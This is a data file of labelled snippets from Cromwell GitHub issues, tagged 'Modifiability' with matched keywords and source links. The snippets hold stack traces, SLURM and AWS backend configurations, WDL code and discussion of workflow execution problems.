cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:2015,Config,ConfigAsyncJobExecutionActor,2015,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,tents$(StandardAsyncExecutionActor.scala:318); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:639); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:639); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:639); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:11328,Config,ConfigAsyncJobExecutionActor,11328,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"test{; call task_A {}; }. task task_A{; command{; echo 'testing'; }; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```; include required(classpath(""application"")). webservice {; }. akka {; http {; server {; }; }; }. system {; io {; }; input-read-limits {; }; job-rate-control {; jobs = 2; per = 1 second; }. abort {; scan-frequency: 30 seconds; cache {; enabled: true; concurrency: 1; ttl: 20 minutes; size: 100000; }; }. dns-cache-ttl: 3 minutes; }. workflow-options {; default {; }; }. call-caching {; enabled = true; }. google {; }. docker {; hash-lookup {; }; }. engine {; filesystems {; local {; }; }; }. languages {; WDL {; versions {; ""draft-2"" {; }; ""1.0"" {; }; }; }; CWL {; versions {; ""v1.0"" {; }; }; }; }. backend {; default = ""SLURM"". providers {. SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int runtime_minutes = 720; Int cpus = 1; Int requested_memory_mb_per_core = 8000; String queue = ""short""; """""". exit-code-timeout-seconds = 600. submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-n "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --constraint=""groups"" \; --qos=ded_reich \; --account=""reich"" \; --wrap ""/usr/bin/env bash ${script}""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*"". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. hashing-strategy: ""path"". check-sibling-md5: false; }; }; }. default-runtime-attributes {; failOnStderr: false; continueOnReturnCode: 0; }; }; }; }; }. services {; MetadataService {; }. Instrumentation {; }; HealthMonitor {; config {; }; }; LoadController {; config {; }; }; }. database {; driver = ""slick.jdbc.MySQLProfile$"". db {; driver ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6929:3048,Config,ConfigBackendLifecycleActorFactory,3048,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6929,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"th database db.url = jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true; Skipping auto-registration; 2021-09-27 13:47:56,493 WARN - Skipping auto-registration; 2021-09-27 13:47:57,524 INFO - Reference disks feature for PAPIv2 backend is not configured.; 2021-09-27 13:47:58,075 INFO - Slf4jLogger started; 2021-09-27 13:47:58,470 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-69bdc1a"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2021-09-27 13:47:58,845 cromwell-system-akka.dispatchers.service-dispatcher-15 INFO - Metadata summary refreshing every 1 second.; 2021-09-27 13:47:58,865 cromwell-system-akka.dispatchers.service-dispatcher-15 INFO - No metadata archiver defined in config; 2021-09-27 13:47:58,865 cromwell-system-akka.dispatchers.service-dispatcher-15 INFO - No metadata deleter defined in config; 2021-09-27 13:47:58,926 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2021-09-27 13:47:58,929 cromwell-system-akka.dispatchers.service-dispatcher-14 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2021-09-27 13:47:58,935 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2021-09-27 13:47:58,937 cromwell-system-akka.actor.default-dispatcher-7 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2021-09-27 13:47:59,274 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - JobExecutionTokenDispenser - Distribution rate: 20 per 10 seconds.; 2021-09-27 13:47:59,340 cromwell-system-akka.dispatchers.backend-dispatcher-34 INFO - Running with 3 PAPI request workers; 2021-09-27 13:47:59,340 cromwe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:6343,config,config,6343,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['config'],['config']
Modifiability,"th in precompiled jar on github (affecting multiple releases tested version 86 and 85). ; Tested to not be affected version 79/56. Main error below. Should be an easy fix. . ```; Exception in thread ""main"" com.typesafe.config.ConfigException$IO: application: application.conf: java.io.IOException: resource not found on classpath: application.conf, application.json: java.io.IOException: resource not found on classpath: application.json, application.properties: java.io.IOException: resource not found on classpath: application.properties; at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:236); at com.typesafe.config.impl.ConfigImpl.parseResourcesAnySyntax(ConfigImpl.java:133); at com.typesafe.config.ConfigFactory.parseResourcesAnySyntax(ConfigFactory.java:1083); at com.typesafe.config.impl.SimpleIncluder.includeResourceWithoutFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(Default",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:1513,config,config,1513,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['config'],['config']
Modifiability,"th_cutoff} -a ${adapters_1} -A ${adapters_2} -u ${trim_start_R1} -u ${trim_end_R1} -U ${trim_start_R2} -U ${trim_end_R2} --length-tag=$TAG -o ${sampleName}.R1.trimmed.gz -p ${sampleName}.R2.trimmed.gz ${input_r1} ${input_r2}; }; output {; File fastq_trimmed_R1 = ""${sampleName}.R1.trimmed.gz""; File fastq_trimmed_R2 = ""${sampleName}.R2.trimmed.gz""; }; }; ```. ### Input for the workflow is this:; ```; #input WDL. {; ""scMeth.sampleName"": ""sub"",; ""scMeth.input_fastq1"": ""sub_1.fastq.gz"",; ""scMeth.input_fastq2"": ""sub_2.fastq.gz"",; ""scMeth.file_format"": ""fastq"",; ""scMeth.command"": ""moveBarcodeToID.pl"",; ""scMeth.low_quality_cutoff"": 21,; ""scMeth.read_length_cutoff"": 62,; ""scMeth.TAG"": ""'length='"",; ""scMeth.bases"": 6,; ""scMeth.trim_start_R1"": 11,; ""scMeth.trim_end_R1"": -16,; ""scMeth.trim_start_R2"": 25,; ""scMeth.trim_end_R2"": -2,; ""scMeth.trimAdapters.sampleName"": ""sub"",; ""scMeth.adapters_1"": ""AGATCGGAAGAGCACACGTCTGAAC"",; ""scMeth.adapters_2"": ""AGATCGGAAGAGCGTCGTGTAGGGA""; }. ```. ### configuration named as `your_2.conf` file is:; ```; include required(classpath(""application"")); ```. ### Run as:; `java -jar -Dconfig.file=your_2.conf cromwell-42.jar run -i scMeth_input_3.json scMeth_v2.wdl.sh`. ### Error is:. ```; [2019-07-10 14:32:46,75] [info] Running with database db.url = jdbc:hsqldb:mem:fad09ca5-b589-4874-b5de-bbd1dc0064fe;shutdown=false;hsqldb.tx=mvcc; [2019-07-10 14:32:53,36] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-07-10 14:32:53,38] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-07-10 14:32:53,46] [info] Running with database db.url = jdbc:hsqldb:mem:39174976-89f7-4769-a52c-7d5a4afc6cf4;shutdown=false;hsqldb.tx=mvcc; [2019-07-10 14:32:53,81] [info] Slf4jLogger started; [2019-07-10 14:32:54,07] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-1cf43fa"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeB",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:3983,config,configuration,3983,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,1,['config'],['configuration']
Modifiability,"thanks for you reply. i mean in `aws backend ` mode, instead of `local mode`. there is no option to set `submit-docker`, i attached the backend part of my aws.conf as follows. ```bash; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; // Base bucket for workflow executions; root = ""s3://yuce/cromwell-execution""; // A reference to an auth defined in the `aws` stanza at the top. This auth is used to create; // Jobs and manipulate auth JSONs.; auth = ""default"". numSubmitAttempts = 3; numCreateDefinitionAttempts = 3. concurrent-job-limit = 16. default-runtime-attributes {; queueArn: ""arn:aws-cn:batch:cn-northwest-1:723230375162:job-queue/first-run-job-queue"",; }. filesystems {; s3 {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""default""; }; }; }; }; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-701201752:325,config,config,325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-701201752,1,['config'],['config']
Modifiability,"the JSON file as an array of 4 strings; call testtask{input: str=strings[idx]}; }; ```; Error:; ```; [2018-10-08 13:27:31,22] [error] WorkflowManagerActor Workflow c2ac7273-c209-4e74-b1f0-a208e89922d8 failed (during ExecutingWorkflowState): Can't index Success(WdlOptionalValue(WdlMaybeEmptyArrayType(WdlStringType),Some([""1"", ""2"", ""3"", ""4""]))) with index Success(WdlInteger(0)); wdl4s.wdl.WdlExpressionException: Can't index Success(WdlOptionalValue(WdlMaybeEmptyArrayType(WdlStringType),Some([""1"", ""2"", ""3"", ""4""]))) with index Success(WdlInteger(0)); ```; ### Zip(); WDL code:; ```; Array[String]? strings1; Array[String]? strings2. Array[Pair[String,String]] string_pair = zip(strings1,strings2); ```; Error:; ```; [2018-10-08 13:31:20,27] [error] WorkflowManagerActor Workflow 832af5bf-2c7e-4e4a-80c5-bc0787910477 failed (during MaterializingWorkflowDescriptorState): Workflow input processing failed:; Workflow has invalid declarations: Could not evaluate workflow declarations:; Test_optional.string_pair:; Invalid parameters for engine function zip: Vector(Success(WdlOptionalValue(WdlMaybeEmptyArrayType(WdlStringType),Some([""1"", ""2"", ""3"", ""4""]))), Success(WdlOptionalValue(WdlMaybeEmptyArrayType(WdlStringType),Some([""a"", ""b"", ""c"", ""d""])))). Requires exactly two evaluated array values of equal length.; cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Workflow has invalid declarations: Could not evaluate workflow declarations:; Test_optional.string_pair:; Invalid parameters for engine function zip: Vector(Success(WdlOptionalValue(WdlMaybeEmptyArrayType(WdlStringType),Some([""1"", ""2"", ""3"", ""4""]))), Success(WdlOptionalValue(WdlMaybeEmptyArrayType(WdlStringType),Some([""a"", ""b"", ""c"", ""d""])))). Requires exactly two evaluated array values of equal length.; ```. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218:3315,config,configuration,3315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218,1,['config'],['configuration']
Modifiability,the example configure file mentioned in [cromwell document](https://cromwell.readthedocs.io/en/stable/Configuring/) shows 404: [cromwell.examples.conf](https://github.com/broadinstitute/cromwell/tree/develop/cromwell.examples.conf),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5359:12,config,configure,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5359,2,"['Config', 'config']","['Configuring', 'configure']"
Modifiability,"then scatter over the output of that task outside of the original scatter. ---. @meganshand commented on [Wed Nov 16 2016](https://github.com/broadinstitute/wdl4s/issues/48#issuecomment-261095003). I tried that workaround with a task like this:. ```; task ZipUpWorkaround {; File unmapped_bam; Array[File] fastqs. command {; #do nothing; }; output {; Pair[File, Array[File]] p = [unmapped_bam, fastqs]; }; }; ```. and got this error message (after it submitted that task):; `Failed to evaluate outputs.: WdlTypeException: Arrays/Maps must have homogeneous types`. ---. @Horneth commented on [Wed Nov 16 2016](https://github.com/broadinstitute/wdl4s/issues/48#issuecomment-261095284). I think `Pair`s are declared with parenthesis and not brackets. Does . ```; output {; Pair[File, Array[File]] p = (unmapped_bam, fastqs); }; ```. work ?. ---. @Horneth commented on [Wed Nov 16 2016](https://github.com/broadinstitute/wdl4s/issues/48#issuecomment-261096132). Also, as long as you don't declared the zip as a workflow variable you should be fine. For example, this should work:. ```; task t {; command {; echo ""hello""; echo ""world""; }; output {; Array[String] o = read_lines(stdout()); }; }. task t2 {; Array[Pair[String, String]] p; command {; #do something; }; output {; Array[Pair[String, String]] o = p; }; }. workflow w {; call t; call t as u; call t2 { input: zip(t.o, u.o) }; }; ```. ---. @meganshand commented on [Thu Nov 17 2016](https://github.com/broadinstitute/wdl4s/issues/48#issuecomment-261247751). Pair with ( ) worked perfectly with the workaround tasks. I tried to not declare a workflow variable, but since I need to scatter over the zipped array I did the following:. `scatter(unmapped_pair in zip(QuerySortSam.sorted_bam, SamToFastq.fastqs)){`. Which gave me the error:. `Workflow input processing failed.; Unable to load namespace from workflow: Unrecognized token on line 282, column 55:`. Regardless, for my current use case I'm happy with my workaround, and using Pair seems to ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2692:2359,variab,variable,2359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2692,1,['variab'],['variable']
Modifiability,"there are still config errors in this space, might want to hold off starting reviews until those are sorted out",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3729#issuecomment-394766552:16,config,config,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3729#issuecomment-394766552,1,['config'],['config']
Modifiability,"thinking about a more elegant way to solve the awkwardness of running a scatter while using Singularity on HPC. The major issues include:; * We run N `singularity build`s, for a scatter over N items, which wastes time and CPU, and writing N large images to the filesystem simultaneously will presumably challenge the filesystem.; * We have to store N `.sif` images, which wastes space while the job is running; * We have to delete the image after each `singularity build`. My first proposed solution was #4673, which would solve the problem but require a pull request to introduce a new hook to Cromwell. And it doesn't look like the Cromwell team have been able to prioritise this. . My new thought is that we could use file locks (e.g. `flock` on linux) to deal with this issue, so that the first worker to run will create a file lock, then all subsequent workers will encounter that lock, and wait until it's removed before attempting to build or run the image. For example, we currently recommend this `submit-docker` configuration:. ```; submit-docker = """"""; # Ensure singularity is loaded if it's installed as a module; module load Singularity/3.0.1; ; # Build the Docker image into a singularity image; DOCKER_NAME=$(sed -e 's/[^A-Za-z0-9._-]/_/g' <<< ${docker}); IMAGE=${cwd}/$DOCKER_NAME.sif; if [ ! -f $IMAGE ]; then; singularity pull $IMAGE docker://${docker}; fi. # Submit the script to SLURM; sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --bind ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. I'm instead proposing this. Note the use of a single shared image directory (`/singularity_cache` in this example), and the use of `flock` to ensure the submit scripts aren't competing with each other:. ```; submit-docker = """"""; # Ensure singularity is loaded if it's installed as a module; modul",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063:1068,config,configuration,1068,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063,1,['config'],['configuration']
Modifiability,this bug has so been refactored out of existence,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/520#issuecomment-253930606:21,refactor,refactored,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/520#issuecomment-253930606,1,['refactor'],['refactored']
Modifiability,"this has come up a few times in a few different issues and that multitude actually makes the larger point here. Internally we've been discussing how to handle this as an upcoming project. In particular the problem is that we have too many different user personas and trying to have a single form of log meet all of their needs is going to be useless. Log levels doesn't quite capture all of the variables that might be in play here as often what happens is that someone 99% of the time only wants to see form X but once in a while *really* needs to see form Y and it's useless if Y wasn't captured at all. We're going to be moving towards some sort of system where there are different sorts of logs and then everyone can be happy, or at least happier. That's probably at least a ""next quarter"" level of project, however.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281771971:395,variab,variables,395,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281771971,1,['variab'],['variables']
Modifiability,"tic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-batch_for_variantcall/execution/script""; [2018-05-02 15:16:57,63] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: job id: 134053; [2018-05-02 15:16:57,66] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from - to WaitingForReturnCodeFile; [2018-05-02 15:17:05,03] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from WaitingForReturnCodeFile to Done; [2018-05-02 15:22:54,62] [[38;5;1merror[0m] Failed to hash null; java.io.FileNotFoundException: Cannot hash file null because it can't be found; 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:46); 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); 	at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:79); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:514); 	at akka.actor.Actor.aroundReceive$(Actor.scala:512); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.akka$actor$Timers$$super$aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at akka.actor.Timers.aroundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox.processMailbox(Ma",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:5174,Config,ConfigBackendFileHashingActor,5174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['Config'],['ConfigBackendFileHashingActor']
Modifiability,tion(DataTypeFactory.java:251); 	at liquibase.change.core.CreateTableChange.generateStatements(CreateTableChange.java:70); 	at liquibase.change.AbstractChange.generateStatementsVolatile(AbstractChange.java:287); 	at liquibase.change.AbstractChange.warn(AbstractChange.java:358); 	at liquibase.changelog.visitor.ValidatingVisitor.visit(ValidatingVisitor.java:109); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:83); 	at liquibase.changelog.DatabaseChangeLog.validate(DatabaseChangeLog.java:269); 	at liquibase.Liquibase.update(Liquibase.java:198); 	at liquibase.Liquibase.update(Liquibase.java:179); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); ```; with the linked change; https://github.com/jeremiahsavage/cromwell/commit/88f82a0d699184358149a17a5c1d957704cdced3; the database table creation proceeds; as it undoes one of the changes in this commit; https://github.com/broadinstitute/cromwell/commit/775d2cb414734080978cc9c2533cab41b4acfad5; ```; [jeremiah@localhost cromwell]$ java -Dconfig.file=,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4605:3378,adapt,adapted,3378,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4605,1,['adapt'],['adapted']
Modifiability,tion.TraversableLike$WithFilter.foreach(TraversableLike.scala:788); 	at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:253); 	at scala.collection.generic.Growable.$plus$plus$eq(Growable.scala:59); 	at scala.collection.generic.Growable.$plus$plus$eq$(Growable.scala:50); 	at scala.collection.mutable.ListBuffer.$plus$plus$eq(ListBuffer.scala:186); 	at scala.collection.mutable.ListBuffer.$plus$plus$eq(ListBuffer.scala:44); 	at scala.collection.TraversableLike.to(TraversableLike.scala:590); 	at scala.collection.TraversableLike.to$(TraversableLike.scala:587); 	at scala.collection.AbstractTraversable.to(Traversable.scala:104); 	at scala.collection.TraversableOnce.toList(TraversableOnce.scala:294); 	at scala.collection.TraversableOnce.toList$(TraversableOnce.scala:294); 	at scala.collection.AbstractTraversable.toList(Traversable.scala:104); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$4(EcmaScriptUtil.scala:111); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$4$adapted(EcmaScriptUtil.scala:107); 	at scala.collection.MapLike$MappedValues.$anonfun$foreach$3(MapLike.scala:253); 	at scala.collection.TraversableLike$WithFilter.$anonfun$foreach$1(TraversableLike.scala:789); 	at scala.collection.immutable.Map$Map2.foreach(Map.scala:146); 	at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:788); 	at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:253); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1(EcmaScriptUtil.scala:107); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1$adapted(EcmaScriptUtil.scala:97); 	at cwl.internal.EnhancedRhinoSandbox.eval(EnhancedRhinoSandbox.scala:61); 	at cwl.internal.EcmaScriptUtil$.evalRaw(EcmaScriptUtil.scala:69); 	at cwl.internal.EcmaScriptUtil$.evalStructish(EcmaScriptUtil.scala:97); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:76); 	at cwl.ExpressionEvaluator$.evaluator$1(ExpressionEvaluator.scala:40); 	at cwl.ExpressionEvaluator$.$anonfun$eva,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787:2077,adapt,adapted,2077,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787,1,['adapt'],['adapted']
Modifiability,"tion/script.submit""; [2016-11-24 15:22:45,23] [info] SharedFileSystemAsyncJobExecutionActor [d6475258testMe.printPairStringString:1:1]: job id: 26767; [2016-11-24 15:22:45,23] [info] SharedFileSystemAsyncJobExecutionActor [d6475258testMe.printPairStringString:2:1]: job id: 26770; [2016-11-24 15:22:45,23] [info] SharedFileSystemAsyncJobExecutionActor [d6475258testMe.printPairStringString:0:1]: job id: 26763; [2016-11-24 15:22:46,77] [info] WorkflowExecutionActor-d6475258-0f55-449c-be0b-e08e1e0c5049 [d6475258]: Starting calls: Collector-printPairStringString; [2016-11-24 15:22:46,80] [info] Message [cromwell.subworkflowstore.SubWorkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$b#-2119125994] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-d6475258-0f55-449c-be0b-e08e1e0c5049#337013427] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2016-11-24 15:22:46,81] [error] WorkflowManagerActor Workflow d6475258-0f55-449c-be0b-e08e1e0c5049 failed (during ExecutingWorkflowState): WdlPair(WdlString(foo1),WdlString(bar1)) (of class wdl4s.values.WdlPair); scala.MatchError: WdlPair(WdlString(foo1),WdlString(bar1)) (of class wdl4s.values.WdlPair); 	at cromwell.util.JsonFormatting.WdlValueJsonFormatter$WdlValueJsonFormat$.write(WdlValueJsonFormatter.scala:10); 	at cromwell.util.JsonFormatting.WdlValueJsonFormatter$WdlValueJsonFormat$$anonfun$write$2.apply(WdlValueJsonFormatter.scala:17); 	at 